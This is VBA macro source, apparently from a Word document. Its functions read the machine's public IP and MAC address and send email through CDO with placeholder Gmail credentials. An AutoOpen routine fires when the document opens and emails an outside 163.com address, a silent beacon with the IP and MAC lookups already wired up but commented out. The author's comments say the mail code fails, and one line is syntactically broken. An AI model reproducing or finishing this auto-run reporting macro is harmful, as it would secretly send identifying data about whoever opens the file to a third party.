

Function GetMyPublicIP() As String

    Dim HttpRequest As Object
    
    On Error Resume Next
    'Create the XMLHttpRequest object.
    Set HttpRequest = CreateObject("MSXML2.XMLHTTP")

    'Check if the object was created.
    If Err.Number <> 0 Then
        'Return error message.
        GetMyPublicIP = "Could not create the XMLHttpRequest object!"
        'Release the object and exit.
        Set HttpRequest = Nothing
        Exit Function
    End If
    On Error GoTo 0
    
    'Create the request - no special parameters required.
    HttpRequest.Open "GET", "http://myip.dnsomatic.com", False
    
    'Send the request to the site.
    HttpRequest.Send
        
    'Return the result of the request (the IP string).
    GetMyPublicIP = HttpRequest.ResponseText

End Function

Function GetMyMACAddress() As String

    'Declaring the necessary variables.
    Dim strComputer     As String
    Dim objWMIService   As Object
    Dim colItems        As Object
    Dim objItem         As Object
    Dim myMACAddress    As String
    
    'Set the computer.
    strComputer = "."
    
    'The root\cimv2 namespace is used to access the Win32_NetworkAdapterConfiguration class.
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    
    'A select query is used to get a collection of network adapters that have the property IPEnabled equal to true.
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    
    'Loop through all the collection of adapters and return the MAC address of the first adapter that has a non-empty IP.
    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then myMACAddress = objItem.MACAddress
        Exit For
    Next
    
    'Return the IP string.
    GetMyMACAddress = myMACAddress

End Function


'These two shit also not work...
'well the Dim cm As New CDO.Message seems out of date
'CreateObject("CDO.Message") this with an error "ActiveX component can't create object"
'I did things as https://community.qlik.com/thread/58440 but not work
'and I didn't get this word, maybe important "on the left part, you are Allowing System Access to the macro to create and send the email properly."

Function MailSend(mail As String, subject As String, body As String)

Dim cm As New CDO.Message


cm.From = "my@gmail.com"
cm.To = mail
cm.subject = subject
cm.BodyPart = body

stUl = "http://schemas.microsoft.com/cdo/configuration/"
With cm.Configuration.Fields
.Item(stUl & "smtpserver") = smtp.gmail.com
.Item(stUl & "smtpserverport") = 465
.Item(stUl & "sendusing") = 2
.Item(stUl & "smtpauthenticate") = 1
.Item(stUl & "sendusername") = "my@gmail.com"
.Item(stUl & "sendpassword") = "password"
.Item(stUl & "smtpusessl") = 1
.Update
End With
cm.Send
Set cm = Nothing
End Function


Function SendGMail(To_Addr As String, SubjectText As String, BodyText As String)
    From_Addr = "my@gmail.com"
    Password = "password"
    ' Object creation
    Set objMsg = CreateObject("CDO.Message")
    Set msgConf = CreateObject("CDO.Configuration")

    ' Server Configuration
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = From_Addr
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = Password
    msgConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = 1
    msgConf.Fields.Update

    ' Email
    objMsg.To = To_Addr
    objMsg.From = From_Addr
    objMsg.subject = SubjectText
    objMsg.HTMLBody = BodyText
    objMsg.Sender = "Aries_is_there"

    Set objMsg.Configuration = msgConf

    ' Send
    objMsg.Send

    ' Clear
    Set objMsg = Nothing
    Set msgConf = Nothing

End Function


Sub AutoOpen()
'
' AutoOpen Macro
'
'
    'Dim IP As String
    'Dim MAC As String
    
    'IP = GetMyPublicIP()
    'MAC = GetMyMACAddress()
    MailSend "lqzitongyezu@163.com", "hello", "hello test how are you"


End Sub

